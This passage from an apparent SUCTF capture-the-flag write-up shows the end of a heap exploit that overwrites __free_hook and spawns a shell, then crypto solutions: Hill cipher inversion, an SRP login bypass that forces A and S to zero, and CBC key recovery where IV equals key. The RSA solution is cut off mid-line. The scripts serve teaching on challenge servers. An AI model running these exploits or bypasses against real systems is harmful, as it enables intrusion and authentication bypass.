class="number">8</span>)    </span><br><span class="line">    echo(<span class="number">0x7f</span>,<span class="string">'A'</span>*<span class="number">8</span>)    </span><br><span class="line">    k=echo(<span class="number">0x68</span>,<span class="string">'A'</span>*<span class="number">8</span>)    </span><br><span class="line">    libcaddr=u64(k[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">    old=libcaddr</span><br><span class="line">    print(<span class="string">"Another arena--&gt;"</span>+hex(old))</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">    target=libc.address+<span class="number">0xf2519</span>+<span class="number">0x10</span>+<span class="number">1</span> <span class="comment"># onegadget</span></span><br><span class="line">    libcaddr=libcaddr<span class="number">-0x78</span>+<span class="number">0xa00</span></span><br><span class="line">    off=libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-8</span><span class="number">-0x10</span>-libcaddr</span><br><span class="line">    echo(<span class="number">0xf0</span>,p64(off+target)*(<span class="number">0xf0</span>/<span class="number">8</span>))</span><br><span class="line">    p.sendline(str(old+<span class="number">1</span>))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    raw_input()</span><br><span class="line">    echo(off,<span class="string">'AAAA'</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.clean()</span><br><span class="line">    echo(<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">hack()</span><br></pre></td></tr></table></figure>
<p>It is a little pity that nobody solves the challenge <code>heapprint</code>. But what we learned is what matters. So hope you guys enjoy the challenges I make. Feel free to contact me if you have any question.</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h3><p>本题依据原理为Hill密码。magic使用希尔密码对明文字符串加密，获得密文。加密的秘钥是一个有限域GF(2)中的矩阵M，设明文为向量p，则加密后得到的密文向量为c=Mp。出题过程依据的便是该公式。若已知c，若要求p，则在两边同时乘以M的逆矩阵M^(-1)，便得到p=M^(-1) c。下面的解题代码中先从magic.txt文件中读取矩阵M，将其转换成0、1矩阵的形式，再利用SageMath求解M的逆矩阵（SageMath脚本略），之后乘以向量c得到明文向量。代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"cipher.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        s = f.readline().strip()</span><br><span class="line">    s = int(s, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMagic</span><span class="params">()</span>:</span></span><br><span class="line">    magic = []</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"magic.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> (line):</span><br><span class="line">                line = int(line, <span class="number">16</span>)</span><br><span class="line">                magic.append(line)</span><br><span class="line">                <span class="comment"># print bin(line)[2:]</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> magic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic2Matrix</span><span class="params">(magic)</span>:</span></span><br><span class="line">    matrix = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(magic)):</span><br><span class="line">        t = magic[i]</span><br><span class="line">        row = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(magic)):</span><br><span class="line">            element = t &amp; <span class="number">1</span></span><br><span class="line">            row = <span class="string">", "</span> + str(element) + row</span><br><span class="line">            t = t &gt;&gt; <span class="number">1</span></span><br><span class="line">        row = <span class="string">"["</span> + row[<span class="number">2</span>:] + <span class="string">"]"</span></span><br><span class="line">        matrix = matrix + row + <span class="string">",\n"</span></span><br><span class="line"></span><br><span class="line">    matrix = <span class="string">"["</span> + matrix[:<span class="number">-1</span>] + <span class="string">"]"</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"matrix.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(matrix)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare</span><span class="params">()</span>:</span></span><br><span class="line">    magic = getMagic()</span><br><span class="line">    magic2Matrix(magic)</span><br><span class="line">    cipher = getCipher()</span><br><span class="line">    cipherVector = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(magic)):</span><br><span class="line">        element = cipher &amp; <span class="number">1</span></span><br><span class="line">        cipherVector = <span class="string">", "</span> + str(element) + cipherVector</span><br><span class="line">        cipher = cipher &gt;&gt; <span class="number">1</span></span><br><span class="line">    cipherVector = <span class="string">"["</span> + cipherVector[<span class="number">2</span>:] + <span class="string">"]"</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"cVector.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cipherVector)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans2Flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#此处的向量v由SageMath计算得来</span></span><br><span class="line">    v = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(v)):</span><br><span class="line">        flag = flag &lt;&lt; <span class="number">1</span></span><br><span class="line">        flag = flag ^ v[i]</span><br><span class="line">    flag = hex(flag)[<span class="number">2</span> : <span class="number">-1</span>]</span><br><span class="line">    flag = flag.decode(<span class="string">"hex"</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    prepare()<span class="comment">#该步骤用于从magic中读取矩阵M，写入到matrix.txt中，之后到SageMath中计算</span></span><br><span class="line">    trans2Flag()<span class="comment">#将明文向量转换成flag字符串</span></span><br></pre></td></tr></table></figure>
<h3 id="Pass"><a href="#Pass" class="headerlink" title="Pass"></a>Pass</h3><p>本题依据的原理是SRP（Security Remote Password）的一个缺陷。SRP的基本原理如下，客户端计算SCarol = (B − kgx)(a + ux) = (kv + gb − kgx)(a + ux) = (kgx − kgx + gb)(a + ux) = (gb)(a + ux)；服务器端计算SSteve = (Avu)b = (gavu)b = [ga(gx)u]b = (ga + ux)b = (gb)(a + ux)，之后分别计算S的Hash值K，计算K||salt的hash值h。双方最后通过验证h是否一致来实现password验证和身份认证，本质上是Diffie-Hellman秘钥交换的一种演变，都是利用离散对数计算复杂度高实现的密码机制。该缺陷在于若客户端将A强行设置为0或者N的整数倍，那么服务器端计算得到的S SSteve 必为0，此时客户端再将本地的S强行设置为0，便可以得到与服务器端相同的S，进而得到相同的K和相同的h，进而通过服务器端的password验证。在本题的设计中，一旦通过服务器端验证，服务器会发送本题的flag。解题代码如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"> -*- coding: UTF<span class="number">-8</span> -*-</span><br><span class="line"><span class="comment"># 文件名：client.py</span></span><br><span class="line"><span class="comment">#恶意攻击者，将A设置为0、N或者其他N的倍数，导致服务器端计算S时得到的值一定是0；攻击者进一步将自己的S值也设置为0，</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gm</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> agree</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket()</span><br><span class="line"></span><br><span class="line">    s.connect((<span class="string">"game.suctf.asuri.org"</span>, <span class="number">10002</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"connecting..."</span></span><br><span class="line">    <span class="comment">#计算a，向服务器端发送I和A，相当于发起认证请求</span></span><br><span class="line">    a = gm.mpz_rrandomb(agree.seed, <span class="number">20</span>)</span><br><span class="line">    A = gm.powmod(agree.g, a, agree.N)</span><br><span class="line">    A = <span class="number">0</span> <span class="comment">#此处为攻击第一步</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"A:"</span>, A</span><br><span class="line">    message = agree.I + <span class="string">","</span> + str(A).encode(<span class="string">"base_64"</span>).replace(<span class="string">"\n"</span>, <span class="string">""</span>) + <span class="string">"\n"</span></span><br><span class="line">    s.send(message)</span><br><span class="line">    <span class="comment"># 等待接收salt和B，salt稍后用于和password一起生成x，若client口令正确，则生成的x和服务器端的x一致</span></span><br><span class="line">    message = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> message</span><br><span class="line">    message = message.split(<span class="string">","</span>)</span><br><span class="line">    salt = int(message[<span class="number">0</span>].decode(<span class="string">"base_64"</span>))</span><br><span class="line">    B = int(message[<span class="number">1</span>].decode(<span class="string">"base_64"</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"received salt and B"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"salt:"</span>, salt</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"B:"</span>, B</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 此时服务器端和客户端都已掌握了A和B，利用A和B计算u</span></span><br><span class="line">    uH = hashlib.sha256(str(A) + str(B)).hexdigest()</span><br><span class="line">    u = int(uH, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"利用A、B计算得到u"</span>, u</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始计算通信秘钥K</span></span><br><span class="line">    <span class="comment"># 利用自己的password和服务器端发来的salt计算x，如果passowrd与服务器端的一致，则计算出的x也是一致的</span></span><br><span class="line">    <span class="comment"># xH = hashlib.sha256(str(salt) + agree.P).hexdigest()</span></span><br><span class="line">    wrongPassword = <span class="string">"test"</span></span><br><span class="line">    xH = hashlib.sha256(str(salt) + <span class="string">"wrong_password"</span>).hexdigest()</span><br><span class="line">    x = int(xH, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"x:"</span>, x</span><br><span class="line"></span><br><span class="line">    <span class="comment">#客户端公式：S = (B - k * g**x)**(a + u * x) % N</span></span><br><span class="line">    <span class="comment">#服务器端公式：S = (A * v**u) ** b % N</span></span><br><span class="line">    S = B - agree.k * gm.powmod(agree.g, x, agree.N)<span class="comment">#此值应当与g**b一致</span></span><br><span class="line">    S = gm.powmod(S, (a + u*x), agree.N)</span><br><span class="line">    S = <span class="number">0</span> <span class="comment">#此处为攻击第二步</span></span><br><span class="line">    K = hashlib.sha256(str(S)).hexdigest()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"K:"</span>, K</span><br><span class="line"></span><br><span class="line">    <span class="comment">#最后一步，发送验证信息HMAC-SHA256(K, salt)，如果得到服务器验证，则会收到确认信息</span></span><br><span class="line">    hmac = hashlib.sha256(K + str(salt)).hexdigest() + <span class="string">"\n"</span></span><br><span class="line">    s.send(hmac)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"send:"</span>, hmac</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"receive:"</span>, s.recv(<span class="number">1024</span>)</span><br><span class="line">    message = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> message</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="Enjoy"><a href="#Enjoy" class="headerlink" title="Enjoy"></a>Enjoy</h3><p>本题依据原理为针对IV=Key的CBC模式选择密文攻击，前提是明文泄露。enjoy.py使用AES、CBC模式对明文加密后发送到服务器端，且将CBC模式的初始化向量IV设置为AES的秘钥，而秘钥正是flag。随意设置一秘钥加密明文发往服务器端，服务器很容易泄露对应明文。因此选择三个分组的密文C||0||C发往服务器获得泄露出的明文p_1 ||p_2 ||p_3，因此根据CBC模式的加解密原理有：<br>IV⊕D(K,C)=p_1                          （1）<br>0⊕D(K,C)=p_3                          （2）<br>其中D为AES解密算法，两式做异或得：IV=p_1⊕p_3。<br>解题代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: UTF-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(message)</span>:</span></span><br><span class="line">    toPadByte = <span class="number">16</span> - len(message) % <span class="number">16</span></span><br><span class="line">    paddedMessage = message + chr(toPadByte) * toPadByte</span><br><span class="line">    <span class="keyword">return</span> paddedMessage</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain)</span>:</span></span><br><span class="line">    key = flag.flag[<span class="number">5</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(key) == <span class="number">16</span></span><br><span class="line">    iv = key</span><br><span class="line">    plain = padding(plain)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    cipher = aes.encrypt(plain)</span><br><span class="line">    cipher = cipher.encode(<span class="string">"base_64"</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runTheClient</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    host = <span class="string">"registry.asuri.org"</span></span><br><span class="line">    port = <span class="number">10003</span></span><br><span class="line">    <span class="comment"># plain = "blablabla_" + "I_enjoy_cryptography" + "_blablabla"</span></span><br><span class="line">    <span class="comment"># cipher = encrypt(plain)message =  s.recv(1024)</span></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    <span class="comment"># message = s.recv(1024)</span></span><br><span class="line">    <span class="comment"># print message</span></span><br><span class="line">    s.send(cipher)</span><br><span class="line"></span><br><span class="line">    message =  s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> message</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">()</span>:</span></span><br><span class="line">    block = <span class="string">"A"</span> * <span class="number">16</span></span><br><span class="line">    cipher = block + <span class="string">"\x00"</span>*<span class="number">16</span> + block</span><br><span class="line">    cipher = cipher.encode(<span class="string">"base_64"</span>) + <span class="string">"\n"</span></span><br><span class="line">    message = runTheClient(cipher)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"high ASCII"</span> <span class="keyword">in</span> message:</span><br><span class="line">        begin = message.find(<span class="string">":"</span>)</span><br><span class="line">        plain = message[begin+<span class="number">1</span>:].strip().decode(<span class="string">"base_64"</span>)</span><br><span class="line">        block1 = plain[:<span class="number">16</span>]</span><br><span class="line">        block3 = plain[<span class="number">32</span>:<span class="number">48</span>]</span><br><span class="line">        key = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            key = key + chr(ord(block1[i]) ^ ord(block3[i]))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"key"</span>, key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    crack()</span><br></pre></td></tr></table></figure>
<h3 id="Rsa"><a href="#Rsa" class="headerlink" title="Rsa"></a>Rsa</h3><p>求逆元而已</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Random import random</span><br><span class="line">import binascii</span><br><span class="line">import hashlib</span><br><span class="line">from  binascii import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def invmod(a, n):</span><br><span class="line">    t = 0</span><br><span class="line">    new_t = 1</span><br><span class="line">    r = n</span><br><span class="line">    new_r = a</span><br><span class="line">    while new_r != 0:</span><br><span class="line">        q = r // new_r</span><br><span class="line">        (t, new_t) = (new_t, t - q * new_t)</span><br><span class="line">        (r, new_r) = (new_r, r - q * new_r)</span><br><span class="line">    if r &gt; 1:</span><br><span class="line">        raise Exception(&apos;unexpected&apos;)</span><br><span class="line">    if t &lt; 0:</span><br><span class="line">        t += n</span><br><span class="line">    return t</span><br><span class="line"></span><br><span class="line">def b2n(s):</span><br><span class="line">    return int.from_bytes(s, byteorder=&apos;big&apos;)</span><br><span class="line"></span><br><span class="line">def n2b(k):</span><br><span class="line">    return k.to_bytes((k.bit_length() + 7) // 8, byteorder=&apos;big&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debytes(n,d,cbytes):</span><br><span class="line">    c = b2n(cbytes)</span><br><span class="line">    m = pow(c, d, n)</span><br><span class="line">    return n2b(m)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    n = 66149493853860125655150678752885836472715520549317267741824354889440460566691154181636718588153443015417215213251189974308428954171272424064509738848419271456903929717740317926997980290509229295248854525731680211522487069759263212622412183077554313970550489432550306334816699481767522615564029948983958568137620658877310430228751724173392407096452402130591891085563316308684064273945573863484366971922314948362237647033045688312629960213147916734376716527936706960022935808934003360529947191458592952573768999508441911956808173380895703456745350452416319736699139180410176783788574649448360069042777614429267146945551</span><br><span class="line">    e = 3</span><br><span class="line">    d = 44099662569240083770100452501923890981810347032878178494549569926293640377794102787757812392102295343611476808834126649538952636114181616043006492565612847637935953145160211951331986860339486196832569683821120141014991379839508808414941455385036209313700326288366870889877799654511681743709353299322639045424737161223404842883211346043467541833205836604553399746326181139106884008412679110817142624390168364685584282908134947826592906891361640349523847551416712367526240125746834000852838264832774661329773724115660989856782878284849614002221996848649738605272015463464761741155635215695838441165137785286974315511355</span><br><span class="line">    c2 = 